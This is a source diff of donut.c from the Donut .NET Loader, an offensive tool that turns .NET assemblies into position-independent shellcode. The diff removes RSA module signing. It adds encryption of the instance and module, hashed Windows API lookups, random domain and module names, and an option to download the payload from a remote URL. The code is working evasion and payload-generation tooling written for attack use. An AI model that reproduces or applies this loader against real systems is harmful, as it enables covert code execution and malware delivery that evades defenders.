@@ -31,16 +31,12 @@
 
 #include "donut.h"
 
-API_IMPORT api_imports[]=
+// these have to be in same order as structure in donut.h
+static API_IMPORT api_imports[]=
 { {KERNEL32_DLL, "LoadLibraryA"},
 
   {KERNEL32_DLL, "VirtualAlloc"},
   {KERNEL32_DLL, "VirtualFree"},
-  {KERNEL32_DLL, "LocalFree"},
-  {KERNEL32_DLL, "FindResourceA"},
-  {KERNEL32_DLL, "LoadResource"},
-  {KERNEL32_DLL, "LockResource"},
-  {KERNEL32_DLL, "SizeofResource"},
   
   {MSCOREE_DLL,  "CLRCreateInstance"},
   
@@ -61,58 +57,32 @@ API_IMPORT api_imports[]=
   {WININET_DLL,  "HttpSendRequestA"},
   {WININET_DLL,  "HttpQueryInfoA"},
   
-  {ADVAPI32_DLL, "CryptAcquireContextA"},
-  {ADVAPI32_DLL, "CryptCreateHash"},
-  {ADVAPI32_DLL, "CryptHashData"},
-  {ADVAPI32_DLL, "CryptVerifySignatureA"},
-  {ADVAPI32_DLL, "CryptDestroyHash"},
-  {ADVAPI32_DLL, "CryptDestroyKey"},
-  {ADVAPI32_DLL, "CryptReleaseContext"},
-  
-  {CRYPT32_DLL,  "CryptStringToBinaryA"},
-  {CRYPT32_DLL,  "CryptDecodeObjectEx"},
-  {CRYPT32_DLL,  "CryptImportPublicKeyInfo"},
-  
   { NULL, NULL }
 };
 
-GUID xCLSID_CorRuntimeHost = {
+static GUID xCLSID_CorRuntimeHost = {
   0xcb2f6723, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};
 
-GUID xIID_ICorRuntimeHost = {
+static GUID xIID_ICorRuntimeHost = {
   0xcb2f6722, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};
 
-GUID xCLSID_CLRMetaHost = {
+static GUID xCLSID_CLRMetaHost = {
   0x9280188d, 0xe8e, 0x4867, {0xb3, 0xc, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde}};
   
-GUID xIID_ICLRMetaHost = {
+static GUID xIID_ICLRMetaHost = {
   0xD332DB9E, 0xB9B3, 0x4125, {0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16}};
   
-GUID xIID_ICLRRuntimeInfo = {
+static GUID xIID_ICLRRuntimeInfo = {
   0xBD39D1D2, 0xBA2F, 0x486a, {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}};
 
-GUID xIID_AppDomain = {
+static GUID xIID_AppDomain = {
   0x05F696DC, 0x2B29, 0x3663, {0xAD, 0x8B, 0xC4,0x38, 0x9C, 0xF2, 0xA7, 0x13}};
   
-GUID IID_AppDomain = 
-{ 0x05F696DC, 0x2B29, 0x3663, {0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13}};
-
-// used to convert digital signature between LE or BE
-static void byte_swap(void *buf, int len) {
-    int     i;
-    uint8_t t, *p=(uint8_t*)buf;
-
-    for(i=0; i<len/2; i++) {
-      t = p[i];
-      p[i] = p[len - 1 - i];
-      p[len - 1 - i] = t;
-    }
-}
-
 // returns 1 on success else <=0
-EXPORT_FUNC int GenRandom(void *buf, size_t len) {
+// this doesn't have to be secure
+EXPORT_FUNC int CreateRandom(void *buf, size_t len) {
     
-#if defined(_WIN32) || defined(_WIN64)
+#if defined(WINDOWS)
     HCRYPTPROV prov;
     int        ok;
     
@@ -127,185 +97,35 @@ EXPORT_FUNC int GenRandom(void *buf, size_t len) {
     
     return ok;
 #else
-    return RAND_bytes(buf, len);
+    FILE   *fd;
+    size_t  r;
+    
+    fd = fopen("/dev/random", "rb");
+    if(fd != NULL) {
+      r = fread(buf, 1, len, fd);
+      fclose(fd);
+    }
+    return r == len;
 #endif
 }
 
-// digitally sign module for configuration
-EXPORT_FUNC int SignModule(PDONUT_CONFIG c) {
-    FILE       *fd;
-    struct stat fs;
-    int         ok = 0, siglen = 0;
+// generate a random string, not exceeding DONUT_MAX_NAME bytes
+static int GenRandomString(void *output, size_t len) {
+    uint8_t rnd[DONUT_MAX_NAME];
+    int     i;
+    char    tbl[]="HMN34P67R9TWCXYF"; // not enough?
+    char    *str = (char*)output;
     
-    // 1. no configuration? return
-    if(c == NULL) return 0;
+    if(len == 0 || len > DONUT_MAX_NAME) return 0;
     
-    // no module? return
-    if(c->mod == NULL || c->modlen == 0) return 0;
+    // generate DONUT_MAX_NAME random bytes
+    if(!CreateRandom(rnd, DONUT_MAX_NAME)) return 0;
     
-    // 2. no private key? return
-    if(c->privkey == NULL) return 0;
-
-    // 3. try obtain the size of private key on disk
-    if(stat(c->privkey, &fs) != 0) return 0;
-
-    // 4. file size is zero? return
-    if(fs.st_size == 0) return 0;
-
-    // 5. can't open private key for reading? return
-    fd = fopen(c->privkey, "rb");
-    if(fd == NULL) return 0;
-    
-#if defined(_WIN32) || defined(_WIN64)
-    HCRYPTPROV              prov;
-    HCRYPTKEY               key;
-    HCRYPTHASH              hash;
-    PCRYPT_PRIVATE_KEY_INFO pki = 0;
-    PBYTE                   pem, keyData, derData, p;
-    DWORD                   keyLen,
-                            pkiLen,
-                            derLen;
-
-    // 6. try allocate memory for PEM string
-    pem = (char*)malloc(fs.st_size);
-    if(pem != NULL) {
-      // 7. read PEM string
-      fread(pem, 1, fs.st_size, fd);
-
-      // 8. acquire crypto context
-      DPRINT("Acquiring crypto context");
-      ok = CryptAcquireContext(
-          &prov, NULL, NULL,
-          PROV_RSA_AES,
-          CRYPT_VERIFYCONTEXT | CRYPT_SILENT);
-
-      if(ok) {
-        // 9. obtain space required to decode PEM string into DER binary
-        derLen = 0;
-        DPRINT("Calculating space required for PEM to DER conversion");
-        ok = CryptStringToBinaryA(
-            pem, 0, CRYPT_STRING_ANY,
-            NULL, &derLen, NULL, NULL);
-
-        // 10. allocate space for DER binary
-        derData = (PBYTE)malloc(derLen);
-
-        if(derData != NULL) {
-          // 11. convert PEM string to DER binary
-          DPRINT("Converting PEM to DER");
-          
-          ok = CryptStringToBinaryA(
-              pem, 0, CRYPT_STRING_ANY,
-              derData, &derLen, NULL, NULL);
-
-          if(ok) {
-            // 12. convert DER binary to private key blob
-            DPRINT("Decoding DER into private key blob", derLen);
-            pkiLen = 0;
-            
-            ok = CryptDecodeObjectEx(
-                X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, 
-                PKCS_RSA_PRIVATE_KEY,
-                derData, derLen, 
-                CRYPT_DECODE_ALLOC_FLAG,
-                NULL, &keyData, &keyLen);
-
-            if(ok) {
-              // 13. import blob into crypto API key object
-              DPRINT("Importing private key blob");
-              
-              ok = CryptImportKey(
-                  prov, keyData, keyLen,
-                  0, CRYPT_EXPORTABLE, &key);
-              if(ok) {
-                // 14. create a hash object
-                DPRINT("Creating hash object");
-                
-                ok = CryptCreateHash(
-                    prov, CALG_SHA_256, 0, 0, &hash);
-                if(ok) {
-                  // 15. hash module data
-                  DPRINT("Generating hash from %zi bytes of data", 
-                    c->modlen - DONUT_SIG_LEN - sizeof(DWORD));
-                  p = (PBYTE)c->mod;
-                  p += DONUT_SIG_LEN + sizeof(DWORD);
-                  
-                  ok = CryptHashData(
-                      hash, p, 
-                      (DWORD)c->modlen - DONUT_SIG_LEN - sizeof(DWORD), 0);
-
-                  if(ok) {
-                    // 16. sign hash with private key
-                    siglen = 0;
-                    DPRINT("Calculating space for signature");
-                    
-                    ok = CryptSignHash(
-                        hash, AT_KEYEXCHANGE, NULL,
-                        0, NULL, (PDWORD)&siglen);
-                    if(ok) {
-                      if(siglen == DONUT_SIG_LEN) {
-                        DPRINT("Computing signature for hash");
-                        
-                        ok = CryptSignHash(
-                          hash, AT_KEYEXCHANGE, NULL,
-                          0, (PBYTE)&c->mod->modsig, (PDWORD)&siglen);
-                      }
-                    }
-                  }
-                  CryptDestroyHash(hash);
-                }
-                CryptDestroyKey(key);
-              }
-              LocalFree(keyData);
-            }
-          }
-          free(derData);
-        }
-        CryptReleaseContext(prov, 0);
-      }
-      free(pem);
+    // generate a string using unambiguous characters
+    for(i=0; i<len; i++) {
+     str[i] = tbl[rnd[i] % (sizeof(tbl) - 1)];
     }
-#else
-    EVP_MD_CTX *md;
-    EVP_PKEY   *pkey;
-    uint8_t    *p;
-    
-    OpenSSL_add_all_digests();
-    // 6. create a message digest context
-    md = EVP_MD_CTX_create();
-
-    if(md != NULL) {
-      // 7. read private key into key object
-      pkey = PEM_read_PrivateKey(fd, NULL, NULL, NULL);
-      if(pkey != NULL) {
-        // 8. obtain size of signature
-        siglen = EVP_PKEY_size(pkey);
-        // 9. make sure it doesn't exceed defined length
-        if(siglen == DONUT_SIG_LEN) {
-          // 10. initialize digest context
-          if(EVP_SignInit_ex(md, EVP_sha256(), NULL)) {
-            p = (uint8_t*)c->mod;
-            p += DONUT_SIG_LEN + sizeof(int);
-            // 11. hash module
-            if(EVP_SignUpdate(md, p, c->modlen - DONUT_SIG_LEN - sizeof(int))) {
-              // 12. get signature
-              ok = EVP_SignFinal(md, c->mod->modsig, &siglen, pkey);
-              // 13. convert from big-endian to little-endian
-              // because crypto API uses LE format
-              if(ok) {
-                byte_swap(c->mod->modsig, DONUT_SIG_LEN);
-              }
-            }
-          }
-        }
-        EVP_PKEY_free(pkey);
-      }
-      EVP_MD_CTX_destroy(md);
-    }
-#endif
-    fclose(fd);
-    
-    return ok;
+    return 1;
 }
 
 // create a donut module for configuration
@@ -317,23 +137,24 @@ EXPORT_FUNC int CreateModule(PDONUT_CONFIG c) {
     size_t        len;
     char          *param;
     int           cnt;
-
+    
+    // no parameter? exit
     DPRINT("Checking configuration");
     if(c == NULL) return 0;
     
-    // no file, public or private key?
-    if(c->file    == NULL ||
-       c->privkey == NULL ||
-       c->pubkey  == NULL) return 0;
+    // no file? exit
+    DPRINT("Checking .NET assembly");
+    if(c->file == NULL) return 0;
 
-    // no file size? return
-    if(stat(c->file, &fs)!=0) return 0;
+    // inaccessibe? exit
+    DPRINT("stat(%s)", c->file);
+    if(stat(c->file, &fs) != 0) return 0;
 
-    // file size is zero? return
+    // zero file size? exit
     if(fs.st_size == 0) return 0;
 
     // try open assembly
-    DPRINT("Opening assembly");
+    DPRINT("Opening %s...", c->file);
     fd = fopen(c->file, "rb");
 
     // not opened? return
@@ -341,13 +162,28 @@ EXPORT_FUNC int CreateModule(PDONUT_CONFIG c) {
 
     // allocate memory for module information and assembly
     len = sizeof(DONUT_MODULE) + fs.st_size;
+    DPRINT("Allocating %zi bytes of memory for DONUT_MODULE", len);
     mod = calloc(len, sizeof(uint8_t));
 
     // if memory allocated
     if(mod != NULL) {
-      // initialize namespace/class, method and runtime version
-      mbstowcs((wchar_t*)mod->cls,     c->cls,             strlen(c->cls));
-      mbstowcs((wchar_t*)mod->method,  c->method,          strlen(c->method));
+      // initialize domain, namespace/class, method and runtime version
+      
+      // if no domain name specified, generate a random string for it
+      if(c->domain[0] == 0) {
+        if(!GenRandomString(c->domain, 8)) return 0;
+      }
+    
+      DPRINT("Domain  : %s", c->domain);
+      mbstowcs((wchar_t*)mod->domain,  c->domain, strlen(c->domain));
+      
+      DPRINT("Class   : %s", c->cls);
+      mbstowcs((wchar_t*)mod->cls,     c->cls,    strlen(c->cls));
+      
+      DPRINT("Method  : %s", c->method);
+      mbstowcs((wchar_t*)mod->method,  c->method, strlen(c->method));
+      
+      DPRINT("Runtime : %s", DONUT_RUNTIME_NET4);
       mbstowcs((wchar_t*)mod->runtime, DONUT_RUNTIME_NET4, strlen(DONUT_RUNTIME_NET4));
 
       // if parameters specified
@@ -375,18 +211,9 @@ EXPORT_FUNC int CreateModule(PDONUT_CONFIG c) {
     // memory allocation failed? return
     if(mod == NULL) return 0;
     // update configuration with pointer to module
-    c->mod    = mod;
-    c->modlen = len;
-    // try signing the module info
-    DPRINT("Signing module with RSA");
-    if(!SignModule(c)) {
-      DPRINT("RSA signing failed");
-      // if sign failed, release memory for module and return zero
-      free(c->mod);
-      c->mod    = NULL;
-      c->modlen = 0;
-      return 0;
-    }
+    c->mod     = mod;
+    c->mod_len = len;
+    
     return 1;
 }
 
@@ -395,54 +222,62 @@ EXPORT_FUNC int CreateModule(PDONUT_CONFIG c) {
 EXPORT_FUNC int CreateInstance(PDONUT_CONFIG c) {
     DONUT_CRYPT     inst_key, mod_key;
     PDONUT_INSTANCE inst = NULL;
-    int             cnt, i;
-    FILE            *fd;
-    struct stat     fs;
-    uint64_t        ulDllHash, rnd;
-    size_t          instlen = 0;
-    uint8_t         *data;
+    size_t          url_len, inst_len = 0;
+    uint64_t        dll_hash=0, iv=0;
+    int             cnt;
     
-    // no configuration? return
+    // no configuration? exit
+    DPRINT("Checking configuration parameter");
     if(c == NULL) return 0;
     
-    // no module? return
+    // no module? exit
+    DPRINT("Checking module");
     if(c->mod == NULL) return 0;
     
-    // calculate the size of instance based on type
+    DPRINT("Generating random IV for Maru hash");
+    if(!CreateRandom(&iv, MARU_IV_LEN)) return 0;
+    
+    DPRINT("Generating random key for encrypting instance");
+    if(!CreateRandom(&inst_key, sizeof(DONUT_CRYPT))) return 0;
+    
+    DPRINT("Generating random key for encrypting module");
+    if(!CreateRandom(&mod_key, sizeof(DONUT_CRYPT))) return 0;
+    
+    // if this is a URL instance, generate a random name for module
+    if(c->type == DONUT_INSTANCE_URL) {
+      if(!GenRandomString(c->modname, 8)) return 0;
+      DPRINT("Generated random name for module : %s", c->modname);
+    }
+    
+    // calculate the size of instance based on the type
     DPRINT("Allocating space for instance");
-    instlen = sizeof(DONUT_INSTANCE);
+    
+    inst_len = sizeof(DONUT_INSTANCE);
     
     // if this is a PIC instance, add the size of module
-    // which will be appended to the end of data
+    // which will be appended to the end of structure
     if(c->type == DONUT_INSTANCE_PIC) {
-      DPRINT("The size of module is %i bytes. Adding to size of instance.", 
-        c->modlen);
-      instlen += c->modlen;
+      DPRINT("The size of module is %i bytes. " 
+             "Adding to size of instance.", c->mod_len);
+      inst_len += c->mod_len;
     }
-    inst = (PDONUT_INSTANCE)malloc(instlen);
+    // allocate memory
+    inst = (PDONUT_INSTANCE)malloc(inst_len);
+    
+    // if we failed? return
     if(inst == NULL) return 0;
     
-    // generate a random IV for maru hash
-    DPRINT("Generating random IV for Maru hash");
-    if(!GenRandom(&inst->ulIV, MARU_IV_LEN)) return 0;
-
-    // generate a random key and counter to encrypt instance
-    DPRINT("Generating random key for instance");
-    if(!GenRandom(&inst_key, sizeof(DONUT_CRYPT))) return 0;
-    memcpy(&inst->Key, &inst_key, sizeof(DONUT_CRYPT));
-
-    // generate a random key and counter to encrypt module
-    DPRINT("Generating random key for module");
-    if(!GenRandom(&mod_key, sizeof(DONUT_CRYPT))) return 0;
-    memcpy(&inst->ModuleKey, &mod_key, sizeof(DONUT_CRYPT));
+#if !defined(NOCRYPTO)
+    DPRINT("Setting the decryption key for instance");
+    memcpy(&inst->key, &inst_key, sizeof(DONUT_CRYPT));
     
-    // generate a random 8 character name for the module
-    if(!GenRandom(&rnd, sizeof(rnd)));
-    for(i=0;i<8;i++) {
-      c->modname[i] = (rnd % 26) + 'a';
-      rnd >>= 2;
-    }
-    // copy GUID structures
+    DPRINT("Setting the decryption key for module");
+    memcpy(&inst->mod_key, &mod_key, sizeof(DONUT_CRYPT));
+    
+    if(!GenRandomString(inst->sig, 8)) return 0;
+    DPRINT("Generated random string for signature : %s", inst->sig);
+#endif
+   
     DPRINT("Copying GUID structures to instance");
     memcpy(&inst->xIID_AppDomain,        &xIID_AppDomain,        sizeof(GUID));
     memcpy(&inst->xIID_ICLRMetaHost,     &xIID_ICLRMetaHost,     sizeof(GUID));
@@ -451,75 +286,98 @@ EXPORT_FUNC int CreateInstance(PDONUT_CONFIG c) {
     memcpy(&inst->xIID_ICorRuntimeHost,  &xIID_ICorRuntimeHost,  sizeof(GUID));
     memcpy(&inst->xCLSID_CorRuntimeHost, &xCLSID_CorRuntimeHost, sizeof(GUID));
 
-    // require API from four different libraries
-    inst->DllCount = 5;
+    DPRINT("Copying DLL strings to instance");
+    inst->dll_cnt = 3;
+    
+    strcpy(inst->dll_name[0], "mscoree.dll" );
+    strcpy(inst->dll_name[1], "oleaut32.dll");
+    strcpy(inst->dll_name[2], "wininet.dll" );
 
-    // copy DLL strings required by API
-    strcpy(inst->szDll[0], "mscoree.dll" );
-    strcpy(inst->szDll[1], "oleaut32.dll");
-    strcpy(inst->szDll[2], "crypt32.dll" );
-    strcpy(inst->szDll[3], "advapi32.dll");
-    strcpy(inst->szDll[4], "wininet.dll");
-
-    // create hashes for API strings
-    DPRINT("Generating hashes for API using IV: %016llX", inst->ulIV);
+    DPRINT("Generating hashes for API using IV: %" PRIx64, iv);
+    inst->iv = iv;
+    
     for(cnt=0; api_imports[cnt].module != NULL; cnt++) {
       // calculate hash for DLL string
-      ulDllHash = maru(api_imports[cnt].module, inst->ulIV);
-      // calculate hash for API string and add to DLL hash, then store in instance
-      inst->api.hash[cnt] = maru(api_imports[cnt].name, inst->ulIV) + ulDllHash;
+      dll_hash = maru(api_imports[cnt].module, iv);
+      
+      // calculate hash for API string.
+      // xor with DLL hash and store in instance
+      inst->api.hash[cnt] = maru(api_imports[cnt].name, iv) ^ dll_hash;
+      
+      DPRINT("Hash for %-15s : %-22s = %" PRIx64, 
+        api_imports[cnt].module, 
+        api_imports[cnt].name,
+        inst->api.hash[cnt]);
     }
     // set how many addresses to resolve
-    inst->ApiCount = cnt;
+    inst->api_cnt = cnt;
 
     // set the type of instance we're creating
-    inst->dwType = c->type;
+    inst->type = c->type;
 
     // if the module will be downloaded
     // set the URL parameter and request verb
     if(c->type == DONUT_INSTANCE_URL) {
-      strcpy(inst->TypeInfo.http.url, c->url);
-      strcat(inst->TypeInfo.http.url, c->modname);
-      strcpy(inst->TypeInfo.http.req, "GET");
+      DPRINT("Setting URL parameters");
+
+      url_len = strlen(c->url);
+      
+      // add forward slash to end if not present
+      if(c->url[url_len-1] != '/') {
+         c->url[url_len  ]  = '/';
+         c->url[url_len+1]  = 0;
+      }
+      
+      strcpy(inst->http.url, c->url);
+      
+      // append module name
+      strcat(inst->http.url, c->modname);
+      // set the request verb
+      strcpy(inst->http.req, "GET");
+      
+      DPRINT("Payload will attempt download from : %s", 
+        inst->http.url);
     }
-    // if the module will be loaded from the resource section
-    // set the name and type
-    else if(c->type == DONUT_INSTANCE_DLL) {
-      strcpy(inst->TypeInfo.resource.name, c->modname);
-      strcpy(inst->TypeInfo.resource.type, "RCDATA");
-    }
 
-    // obtain the size of public key
-    DPRINT("Storing public key");
-    if(stat(c->pubkey, &fs) != 0) return 0;
-
-    // return on invalid size
-    if(fs.st_size == 0 || fs.st_size > DONUT_PUBKEY_LEN) return 0;
-
-    // try open public key for reading
-    fd = fopen(c->pubkey, "rb");
-    if(fd == NULL) return 0;
-    // store public key in instance
-    fread(inst->pubkey, 1, DONUT_PUBKEY_LEN, fd);
-    fclose(fd);
-
-    inst->ModuleLen = c->modlen;
+    inst->mod_len = c->mod_len;
     
+    inst->len   = inst_len;
     c->inst     = inst;
-    c->instlen  = instlen;
-    inst->dwLen = instlen - (sizeof(DONUT_CRYPT) + sizeof(DWORD));
+    c->inst_len = inst_len;
     
+#if !defined(NOCRYPTO)
+    if(c->type == DONUT_INSTANCE_URL) {
+      DPRINT("Encrypting module for download");
+      
+      c->mod->mac = maru(inst->sig, inst->iv);
+      
+      encrypt(
+        mod_key.mk, 
+        mod_key.ctr, 
+        c->mod, 
+        c->mod_len);
+    }
+#endif
     // if PIC, copy module to instance
     if(c->type == DONUT_INSTANCE_PIC) {
       DPRINT("Copying module data to instance");
-      memcpy(&c->inst->Assembly.x, c->mod, c->modlen);
+      memcpy(&c->inst->module.x, c->mod, c->mod_len);
     }
-    data = (uint8_t*)c->inst;
-    data += sizeof(DONUT_CRYPT) + sizeof(DWORD);
     
-    // encrypt instance
-    encrypt(inst_key.key, inst_key.ctr, data, inst->dwLen);
+#if !defined(NOCRYPTO)
+    DPRINT("Encrypting instance");
     
+    inst->mac = maru(inst->sig, inst->iv);
+    
+    uint32_t ofs = sizeof(uint32_t) + sizeof(DONUT_CRYPT);
+    uint8_t *inst_data = (uint8_t*)inst + ofs;
+    
+    encrypt(
+      inst_key.mk, 
+      inst_key.ctr, 
+      inst_data, 
+      c->inst_len - ofs);
+#endif
     return 1;
 }
   
@@ -531,17 +389,17 @@ EXPORT_FUNC int CreatePayload(PDONUT_CONFIG c) {
     char     *plfile;
     struct   stat fs;
     
-    // 
     if(c->arch == DONUT_ARCH_X86) {
-      DPRINT("using x86");
+      DPRINT("using x86 payload");
       plfile = "payload.exe32.bin";
     } else {
-      DPRINT("using amd64");
+      DPRINT("using AMD64 payload");
       plfile = "payload.exe64.bin";
     }
     
     // 1. stat payload
     DPRINT("stat(%s)", plfile);
+    
     if(stat(plfile, &fs) != 0) {
       return DONUT_ERROR_PAYLOAD_MISSING;
     }
@@ -551,15 +409,16 @@ EXPORT_FUNC int CreatePayload(PDONUT_CONFIG c) {
     }
     // 3. attempt to open payload
     DPRINT("fopen(%s)", plfile);
-    pfd=fopen(plfile, "rb");
     
-    if(pfd==NULL) {
+    pfd = fopen(plfile, "rb");
+    
+    if(pfd == NULL) {
       return DONUT_ERROR_PAYLOAD_ACCESS;
     }
     // 4. allocate memory for payload
-    pld=malloc(fs.st_size);
+    pld = malloc(fs.st_size);
     
-    if(pld!=NULL) {
+    if(pld != NULL) {
       // 5. read payload into memory
       fread(pld, 1, fs.st_size, pfd);
       // 6. create the module
@@ -576,25 +435,26 @@ EXPORT_FUNC int CreatePayload(PDONUT_CONFIG c) {
             fd=fopen("instance", "wb");
             
             if(fd != NULL) {
-              fwrite(c->inst, 1, c->instlen, fd);
+              fwrite(c->inst, 1, c->inst_len, fd);
               fclose(fd);
             }
           #endif
           // 8. if this module will be stored on a remote server
           if(c->type == DONUT_INSTANCE_URL) {
+            DPRINT("Saving %s to disk.", c->modname);
             // save module to disk
-            fd=fopen(c->modname, "wb");
+            fd = fopen(c->modname, "wb");
             
             if(fd != NULL) {
-              fwrite(c->mod, 1, c->modlen, fd);
+              fwrite(c->mod, 1, c->mod_len, fd);
               fclose(fd);
             }
           }
           // 9. calculate size of PIC + instance combined
           // allow additional space for some x86/amd64 opcodes
-          c->payloadlen = fs.st_size + c->instlen + 16;
-          c->payload    = malloc(c->payloadlen);
-          pl            = (uint8_t*)c->payload;
+          c->pic_len = fs.st_size + c->inst_len + 16;
+          c->pic     = malloc(c->pic_len);
+          pl            = (uint8_t*)c->pic;
           
           // for now, only x86 and amd64 are supported.
           // since the payload is written in C, 
@@ -602,14 +462,14 @@ EXPORT_FUNC int CreatePayload(PDONUT_CONFIG c) {
           if(pl != NULL) {
             // if DEBUG is defined
             #ifdef DEBUG
-              *pl++ = 0xCC;                   // insert int3
+              //*pl++ = 0xCC;                   // insert int3 for debugging the payload
             #endif
             *pl++ = 0xE8;                     // insert call
-            ((uint32_t*)pl)[0] = c->instlen;  // insert offset to executable code
+            ((uint32_t*)pl)[0] = c->inst_len;  // insert offset to executable code
             pl += sizeof(uint32_t);           // skip 4 bytes used for offset
             // copy the instance (plus the module if attached)
-            memcpy(pl, c->inst, c->instlen);  
-            pl += c->instlen;                 // skip instance
+            memcpy(pl, c->inst, c->inst_len);  
+            pl += c->inst_len;                 // skip instance
             // we use fastcall convention for 32-bit code.
             // microsoft fastcall is used by default for 64-bit code.
             // the pointer to instance is placed in ecx/rcx
@@ -638,9 +498,9 @@ EXPORT_FUNC int ReleasePayload(PDONUT_CONFIG c) {
       c->inst = NULL;
     }
     // free payload
-    if(c->payload != NULL) {
-      free(c->payload);
-      c->payload = NULL;
+    if(c->pic != NULL) {
+      free(c->pic);
+      c->pic = NULL;
     }
     return 1;
 }
@@ -648,7 +508,7 @@ EXPORT_FUNC int ReleasePayload(PDONUT_CONFIG c) {
 // define when building an executable
 #ifdef DONUT_EXE
 
-char* get_param (int argc, char *argv[], int *i) {
+static char* get_param (int argc, char *argv[], int *i) {
     int n = *i;
     if (argv[n][2] != 0) {
       return &argv[n][2];
@@ -661,8 +521,9 @@ char* get_param (int argc, char *argv[], int *i) {
     exit (0);
 }
 
-void usage (void) {
+static void usage (void) {
     printf("\n  usage: donut [options] -f <.NET assembly> | -u <URL hosting donut module>\n\n");
+    
     printf("       -f <path>            .NET assembly to embed in PIC and DLL.\n");
     printf("       -u <URL>             HTTP server hosting the .NET assembly.\n");
     
@@ -671,6 +532,7 @@ void usage (void) {
     printf("       -p <arg1,arg2...>    Optional parameters for method, separated by comma or semi-colon.\n");
     
     printf("       -a <arch>            Target architecture : 1=x86, 2=amd64(default).\n");
+    printf("       -d <name>            Domain name to create for assembly. Randomly generated by default.\n\n");
 
     printf(" examples:\n\n");
     printf("    donut -a 1 -c TestClass -m RunProcess -p notepad.exe -f loader.dll\n");
@@ -684,57 +546,61 @@ int main(int argc, char *argv[]) {
     char         opt;
     int          i;
     FILE         *fd;
-    char         *arch_str[2]={"x86","AMD64"};
-    char         *inst_type[3]={"PIC","URL","DLL"};
+    char         *arch_str[2] = { "x86", "AMD64" };
+    char         *inst_type[2]= { "PIC", "URL"   };
     
-    printf("\n  [ Donut .NET Loader v0.1");
-    printf("\n  [ Copyright (c) 2019 TheWover, Odzhan\n\n");
+    printf("  [ Donut .NET Loader v0.1\n");
+    printf("  [ Copyright (c) 2019 TheWover, Odzhan\n\n");
     
     // zero initialize configuration
     memset(&c, 0, sizeof(c));
     
-    // default type is position independent code
-    c.type    = DONUT_INSTANCE_PIC;
-    c.arch    = DONUT_ARCH_AMD64;
-    
-    c.privkey = "private.pem";
-    c.pubkey  = "public.pem";
+    // default type is position independent code for AMD64
+    c.type = DONUT_INSTANCE_PIC;
+    c.arch = DONUT_ARCH_AMD64;
     
     // parse arguments
-    for(i=1;i<argc;i++) {
-      if(argv[i][0] == '-' || argv[i][0] == '/') {
-        opt = argv[i][1];
-        switch(opt) {
-          // target cpu architecture
-          case 'a':
-            c.arch   = atoi(get_param(argc, argv, &i)) - 1;
-            break;
-          // assembly to use
-          case 'f':
-            c.file   = get_param(argc, argv, &i);
-            break;
-          // url of remote assembly
-          case 'u': {
-            c.url    = get_param(argc, argv, &i);
-            c.type   = DONUT_INSTANCE_URL;
-            break;
-          }
-          // class
-          case 'c':
-            c.cls    = get_param(argc, argv, &i);
-            break;
-          // method
-          case 'm':
-            c.method = get_param(argc, argv, &i);
-            break;
-          // parameters to method
-          case 'p':
-            c.param  = get_param(argc, argv, &i);
-            break;
-          default:
-            usage();
-            break;
+    for(i=1; i<argc; i++) {
+      // switch?
+      if(argv[i][0] != '-' && argv[i][0] != '/') {
+        usage();
+      }
+      opt = argv[i][1];
+      
+      switch(opt) {
+        // target cpu architecture
+        case 'a':
+          c.arch   = atoi(get_param(argc, argv, &i)) - 1;
+          break;
+        // name of domain to use
+        case 'd':
+          strncpy(c.domain, get_param(argc, argv, &i), DONUT_MAX_NAME);
+          break;
+        // assembly to use
+        case 'f':
+          c.file   = get_param(argc, argv, &i);
+          break;
+        // url of remote assembly
+        case 'u': {
+          c.url    = get_param(argc, argv, &i);
+          c.type   = DONUT_INSTANCE_URL;
+          break;
         }
+        // class
+        case 'c':
+          c.cls    = get_param(argc, argv, &i);
+          break;
+        // method
+        case 'm':
+          c.method = get_param(argc, argv, &i);
+          break;
+        // parameters to method
+        case 'p':
+          c.param  = get_param(argc, argv, &i);
+          break;
+        default:
+          usage();
+          break;
       }
     }
     
@@ -767,14 +633,16 @@ int main(int argc, char *argv[]) {
     
     if(CreatePayload(&c) == DONUT_ERROR_SUCCESS) {
       printf("ok.\n");
+      
       if(c.type == DONUT_INSTANCE_URL) {
         printf("  [ Module name   : %s\n", c.modname);
         printf("  [ Upload to     : %s\n", c.url);
       }
       printf("  [ Saving to disk...");
       fd=fopen("payload.bin", "wb");
+      
       if(fd!=NULL) {
-        fwrite(c.payload, 1, c.payloadlen, fd);
+        fwrite(c.pic, 1, c.pic_len, fd);
         fclose(fd);
         printf("ok.\n");
       } else {
